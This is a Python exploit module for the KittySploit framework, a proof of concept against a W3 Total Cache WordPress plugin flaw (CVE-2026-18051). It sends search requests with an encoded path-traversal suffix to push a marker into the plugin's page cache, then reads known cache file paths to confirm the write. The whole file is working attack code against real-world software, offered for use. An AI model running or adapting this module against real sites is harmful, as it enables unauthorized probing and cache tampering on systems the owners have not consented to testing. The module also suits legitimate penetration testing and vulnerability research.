#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""W3 Total Cache CVE-2026-18051 — trigger cache file write via search traversal."""

import re
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "W3 Total Cache CVE-2026-18051 cache write",
        "description": (
            "Auxiliary PoC: seeds page_enhanced cache with unique marker via /search/ traversal. "
            "Does not yield shell — proves arbitrary cache path influence."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-18051"],
        "tags": ["wordpress", "w3-total-cache", "auxiliary", "cve-2026-18051"],
        "agent": {"approval_required": True},
    }

    path = OptString("/", "WordPress base path", required=False)
    marker = OptString("", "Cache marker string (random if empty)", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def _host_label(self) -> str:
        t = str(getattr(self, "target", "") or "")
        t = re.sub(r"^https?://", "", t).split("/")[0].split(":")[0]
        return t or "localhost"

    def run(self):
        mark = (self.marker or "").strip() or f"ks{secrets.token_hex(5)}"
        self.http_request(method="GET", path=self._join(f"/search/{mark}/"), allow_redirects=True)
        self.http_request(
            method="GET",
            path=self._join(f"/search/{mark}/%2e%2e%5c%2e%2e%5c"),
            allow_redirects=True,
        )
        host = self._host_label()
        for cache_path in (
            f"/wp-content/cache/page_enhanced/{host}/_index_slash_ssl.html",
            f"/wp-content/cache/page_enhanced/{host}/_index_slash.html",
        ):
            check = self.http_request(method="GET", path=self._join(cache_path), allow_redirects=False)
            if check and mark in (check.text or ""):
                print_success(f"Marker found in {cache_path}")
                return True
        print_warning("Marker not found in default cache paths — W3TC config may differ")
        return False
